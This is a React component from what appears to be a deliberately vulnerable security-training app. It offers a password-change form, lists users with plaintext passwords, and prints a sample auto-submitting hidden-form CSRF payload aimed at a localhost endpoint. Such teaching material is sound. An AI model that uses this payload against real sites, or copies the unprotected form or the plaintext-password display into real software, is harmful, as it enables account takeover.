import React, { useState, useEffect } from "react";
import { axiosInstance } from "../lib/axios";

const CSRF = () => {
  const [formData, setFormData] = useState({
    userId: "",
    currentPassword: "",
    newPassword: "",
  });

  const [users, setUsers] = useState([]);
  const [responseMessage, setResponseMessage] = useState("");

  // Fetch users on page load
  useEffect(() => {
    const fetchUsers = async () => {
      try {
        const response = await axiosInstance.get("/tasks/csrf");
        setUsers(response.data);
      } catch (error) {
        console.error("Error fetching user data:", error.message);
      }
    };

    fetchUsers();
  }, []); // Runs only once on mount

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setFormData({
      ...formData,
      [name]: value,
    });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      const response = await axiosInstance.post("/tasks/csrf", formData);
      setResponseMessage(response.data.message);

      // Refresh user list after password change
      const updatedUsers = await axiosInstance.get("/tasks/csrf");
      setUsers(updatedUsers.data);
    } catch (error) {
      setResponseMessage("Error: " + (error.response?.data.message || error.message));
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-gray-100 p-6">
      <div className="bg-white p-6 rounded-lg shadow-lg w-full max-w-md text-center">
        <h1 className="text-2xl font-bold text-gray-800 mb-4">Change Password</h1>

        {/* Password Change Form */}
        <form onSubmit={handleSubmit} className="space-y-4">
          <div>
            <label className="block text-left font-medium text-gray-700">User ID:</label>
            <input
              type="text"
              name="userId"
              value={formData.userId}
              onChange={handleInputChange}
              required
              className="w-full p-2 border rounded-md"
            />
          </div>

          <div>
            <label className="block text-left font-medium text-gray-700">Current Password:</label>
            <input
              type="password"
              name="currentPassword"
              value={formData.currentPassword}
              onChange={handleInputChange}
              required
              className="w-full p-2 border rounded-md"
            />
          </div>

          <div>
            <label className="block text-left font-medium text-gray-700">New Password:</label>
            <input
              type="password"
              name="newPassword"
              value={formData.newPassword}
              onChange={handleInputChange}
              required
              className="w-full p-2 border rounded-md"
            />
          </div>

          <button
            type="submit"
            className="w-full bg-blue-600 text-white py-2 rounded-md hover:bg-blue-700 transition"
          >
            Submit
          </button>
        </form>

        {responseMessage && (
          <p className="mt-4 text-lg text-gray-700">{responseMessage}</p>
        )}

        {/* Vulnerable Users List */}
        <h2 className="mt-6 text-xl font-semibold text-gray-800">Vulnerable Users</h2>
        <div className="mt-4 p-3 bg-gray-100 rounded-md border border-gray-300 text-left">
          {users.length > 0 ? (
            users.map((user) => (
              <div key={user.id} className="mb-4 p-2 border-b">
                <p><strong>ID:</strong> {user.id}</p>
                <p><strong>Username:</strong> {user.username}</p>
                <p><strong>Password:</strong> {user.password}</p>
              </div>
            ))
          ) : (
            <p>No user data available</p>
          )}
        </div>

        {/* CSRF Attack Sample Hint */}
        <div className="mt-6 p-4 bg-gray-100 rounded-md border border-gray-300 text-left">
          <h2 className="text-lg font-semibold text-gray-700">
            🔥 CSRF Attack Sample:
          </h2>
          <pre className="bg-gray-200 p-3 rounded-md text-sm overflow-auto">
            {`<!DOCTYPE html>
              <html>
              <body>
                <form action="http://localhost:3050/api/tasks/csrf" method="POST">
                  <!-- Simulated CSRF attack payload -->
                  <input type="hidden" name="userId" value="1">
                  <input type="hidden" name="currentPassword" value="123456">
                  <input type="hidden" name="newPassword" value="111111">
                </form>
                <script>
                  // Automatically submit the form to execute the attack
                  document.forms[0].submit();
                </script>
              </body>
              </html>`}
          </pre>
        </div>

      </div>
    </div>
  );
};

export default CSRF;
